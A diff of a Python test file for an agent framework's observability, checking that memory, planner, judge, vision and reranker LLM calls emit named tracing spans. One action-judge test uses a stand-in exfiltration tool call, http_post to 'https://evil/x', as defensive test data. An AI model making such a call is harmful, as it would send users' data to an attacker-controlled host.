@@ -6,13 +6,20 @@ Each auxiliary path wraps its provider call in
 path under an in-memory span exporter and assert the contracted span
 name lands. One test per span name:
 
-    expert_work.memory.extract        — writeback extraction
-    expert_work.memory.verify         — read-time recall verification
-    expert_work.memory.reconcile      — run-end reconcile (ADD/UPDATE/…)
-    expert_work.orchestrator.planner  — planner node
-    expert_work.orchestrator.reflect  — reflect node
-    expert_work.orchestrator.compress — context compressor summarise
-    expert_work.orchestrator.judge    — output + action judge
+    expert_work.memory.extract            — writeback extraction
+    expert_work.memory.verify             — read-time recall verification
+    expert_work.memory.reconcile          — run-end reconcile (ADD/UPDATE/…)
+    expert_work.orchestrator.planner      — planner node
+    expert_work.orchestrator.reflect      — reflect node
+    expert_work.orchestrator.compress     — context compressor summarise
+    expert_work.orchestrator.judge        — output judge
+    expert_work.orchestrator.judge_action — action (tool-call) judge
+    expert_work.orchestrator.vision       — vision tool VL round-trip
+    expert_work.orchestrator.rerank       — knowledge LLM reranker
+
+Each test also asserts the emitted name is a key in
+``LLM_SPAN_PURPOSES`` — the facade's single source of truth — so a
+producer-side rename can't silently diverge from the purpose contract.
 
 The infrastructure (fake LLM callers, ``InMemoryMemoryStore``,
 ``FakeEmbedder``, cancellation token, state / config shapes) is reused
@@ -33,9 +40,10 @@ from opentelemetry.sdk.trace.export.in_memory_span_exporter import (
     InMemorySpanExporter,
 )
 
-from expert_work.common.observability import init_tracing
+from expert_work.common.observability import LLM_SPAN_PURPOSES, init_tracing
 from expert_work.persistence import InMemoryMemoryStore
 from expert_work.protocol import MemoryItem, StructuredOutputSpec
+from expert_work.protocol.multimodal import ImageRef
 from expert_work.runtime.cancellation import CancellationToken
 from orchestrator import (
     make_memory_writeback_node,
@@ -45,10 +53,17 @@ from orchestrator import (
 from orchestrator.context import ContextCompressor
 from orchestrator.graph_builder.memory import _verify_memories, flush_messages_to_memory
 from orchestrator.llm import FakeEmbedder
+from orchestrator.multimodal import InMemoryImageResolver, ResolvedImage
 from orchestrator.output_judge import LLMActionJudge, LLMOutputJudge
-from orchestrator.tools.registry import ToolSpec
+from orchestrator.tools import LLMReranker
+from orchestrator.tools.registry import ToolContext, ToolSpec
+from orchestrator.tools.vision import AskImageTool
 
 _DIM = 32
+
+# Vision tool ref geometry — copied from test_vision_tool.py.
+_VISION_TENANT = UUID("11111111-1111-1111-1111-111111111111")
+_VISION_THREAD = UUID("22222222-2222-2222-2222-222222222222")
 
 
 # ---------------------------------------------------------------------------
@@ -190,6 +205,7 @@ async def test_memory_extract_emits_named_span(exporter: InMemorySpanExporter) -
         {"configurable": {"tenant_id": str(tenant), "user_id": str(user)}},
     )
     assert "expert_work.memory.extract" in _names(exporter)
+    assert "expert_work.memory.extract" in LLM_SPAN_PURPOSES
 
 
 @pytest.mark.asyncio
@@ -201,6 +217,7 @@ async def test_memory_verify_emits_named_span(exporter: InMemorySpanExporter) ->
     )
     assert [m.content for m in out] == ["keep this"]
     assert "expert_work.memory.verify" in _names(exporter)
+    assert "expert_work.memory.verify" in LLM_SPAN_PURPOSES
 
 
 @pytest.mark.asyncio
@@ -238,6 +255,7 @@ async def test_memory_reconcile_emits_named_span(exporter: InMemorySpanExporter)
         reconcile=True,
     )
     assert "expert_work.memory.reconcile" in _names(exporter)
+    assert "expert_work.memory.reconcile" in LLM_SPAN_PURPOSES
 
 
 # ---------------------------------------------------------------------------
@@ -251,6 +269,7 @@ async def test_planner_emits_named_span(exporter: InMemorySpanExporter) -> None:
     node = make_planner_node(llm)
     await node(_agent_state("decompose me"), {"configurable": {}})  # type: ignore[arg-type]
     assert "expert_work.orchestrator.planner" in _names(exporter)
+    assert "expert_work.orchestrator.planner" in LLM_SPAN_PURPOSES
 
 
 @pytest.mark.asyncio
@@ -264,6 +283,7 @@ async def test_reflect_emits_named_span(exporter: InMemorySpanExporter) -> None:
     }
     await node(state, {"configurable": {}})  # type: ignore[arg-type]
     assert "expert_work.orchestrator.reflect" in _names(exporter)
+    assert "expert_work.orchestrator.reflect" in LLM_SPAN_PURPOSES
 
 
 @pytest.mark.asyncio
@@ -281,15 +301,58 @@ async def test_compress_emits_named_span(exporter: InMemorySpanExporter) -> None
     await compressor.compress(msgs)
     assert summariser.calls == 1
     assert "expert_work.orchestrator.compress" in _names(exporter)
+    assert "expert_work.orchestrator.compress" in LLM_SPAN_PURPOSES
 
 
 @pytest.mark.asyncio
-async def test_judge_emits_named_span(exporter: InMemorySpanExporter) -> None:
-    # OutputJudge.judge + ActionJudge.judge_action share the same span name.
+async def test_output_judge_emits_named_span(exporter: InMemorySpanExporter) -> None:
     await LLMOutputJudge(
         caller=_JudgeCaller('{"aligned": true, "leak_suspected": false, "reason": "ok"}')
     ).judge(user_request="translate", response="Bonjour", context_hint=None)
+    assert _names(exporter).count("expert_work.orchestrator.judge") == 1
+    assert "expert_work.orchestrator.judge" in LLM_SPAN_PURPOSES
+
+
+@pytest.mark.asyncio
+async def test_action_judge_emits_named_span(exporter: InMemorySpanExporter) -> None:
     await LLMActionJudge(caller=_JudgeCaller('{"aligned": false, "reason": "exfil"}')).judge_action(
         user_request="summarise", tool_name="http_post", tool_args={"url": "https://evil/x"}
     )
-    assert _names(exporter).count("expert_work.orchestrator.judge") >= 2
+    assert _names(exporter).count("expert_work.orchestrator.judge_action") == 1
+    assert "expert_work.orchestrator.judge_action" in LLM_SPAN_PURPOSES
+
+
+# ---------------------------------------------------------------------------
+# tools — vision / rerank
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.asyncio
+async def test_vision_emits_named_span(exporter: InMemorySpanExporter) -> None:
+    ref = ImageRef(
+        tenant_id=_VISION_TENANT, thread_id=_VISION_THREAD, image_id=uuid4(), ext=".png"
+    ).to_uri()
+    tool = AskImageTool(
+        vl_caller=_ScriptedLLM(responses=[AIMessage(content="a red apple on a desk")]),
+        image_resolver=InMemoryImageResolver(
+            images={"any": ResolvedImage(media_type="image/png", data=b"PNG")}
+        ),
+    )
+    result = await tool.call(
+        {"image_ref": ref, "question": "what is this?"},
+        ctx=ToolContext(tenant_id=_VISION_TENANT),
+    )
+    assert result.content == "a red apple on a desk"
+    assert "expert_work.orchestrator.vision" in _names(exporter)
+    assert "expert_work.orchestrator.vision" in LLM_SPAN_PURPOSES
+
+
+@pytest.mark.asyncio
+async def test_rerank_emits_named_span(exporter: InMemorySpanExporter) -> None:
+    # A JSON order-array reply drives the reranker's LLM round-trip; a non-empty
+    # document set keeps it off the empty-input fast path so the call fires.
+    reranker = LLMReranker(llm_caller=_ScriptedLLM(responses=[AIMessage(content="[2, 1]")]))
+    order = await reranker.rerank(query="q", documents=["a", "b"], top_k=2, tenant_id=uuid4())
+    assert order == [1, 0]
+    assert "expert_work.orchestrator.rerank" in _names(exporter)
+    assert "expert_work.orchestrator.rerank" in LLM_SPAN_PURPOSES
